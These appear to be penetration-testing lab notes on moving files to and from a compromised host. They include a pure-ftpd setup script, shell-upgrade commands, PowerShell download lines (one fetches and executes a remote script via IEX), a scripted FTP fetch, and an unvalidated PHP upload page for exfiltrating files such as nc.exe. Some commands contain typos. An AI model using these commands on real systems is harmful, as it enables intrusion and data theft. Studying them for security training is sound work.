

    pure-ftpd
        install pure ftpd
            1.configure setup-ftpd.sh
                #!/bin/bash
                sudo groupadd ftpgroup
                sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
                sudo pure-pw useradd offsec -u ftpuser -d /ftphome
                sudo pure-pw mkdb
                cd /etc/pure-ftpd/auth
                sudo ln -s ../conf/PureDB 60pdb
                sudo mkdir -p /ftphome
                sudo chown -R ftpuser:ftpgroup /ftphome/
                sudo systemctl restart pure-ftpd
            2.chmod +x 
            3  ./setup-ftpd.sh
            4 systemctl restart pure-ftpd.ser

    # when get a inactive shell
        # to get a better shell
        python3 -c "import pty; pty.spawn ('/bin/bash')"  

        # to get a interactive shell, after line 21
            ctrl + z
                stty raw -echo
            fg # back to formal command line
            stty raw -echo
            export SHELL=/bin/bash
            export TRRM=screen
            stty rows 50 columns 120
            reset 
    # win7 and later win, powershell download file
        powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://IP/xxx','newname.xx')

        powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://IP/xxx.ps1')
 
     # non-interactive situation
        echo open IP > ftp.txt
        echo USER offsec >> ftp.txt
        echo lab >> ftp.txt #(the password)
        echo bin >> ftp.txt #(onlyif the file is  .exe is needed)
        echo bin >> ftp.txt
        echo GET xx(file name) >> ftp.txt
        echo bye >> ftp.txt
        # then on the source host,,  
            ftp -v -n -s:ftp.txt  #-s set the file to run
*************************************************************************************
    # create a php upload page on the target host to tranfer file
    # upload.php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
//if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile))
//        {echo "file upload successfully.";
//}
//else{
//        echo "failed";
//}
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile);
?>
            # ss -pantu  /* to check the socket port

    # upload.html
<html>
<head>
<meta charset="utf-8">
<title>php-upload</title>
</head>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
    <label for="file">upload fileï¼š</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="submit">
</form>
</body>
</html>

    # on win to upload file
        powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.0.102/upload.php','nc.exe')
    # on linux
        curl -X POST -F "file=@xxx.txt" http://192.168.0.102/upload.php

*************************************************************************************
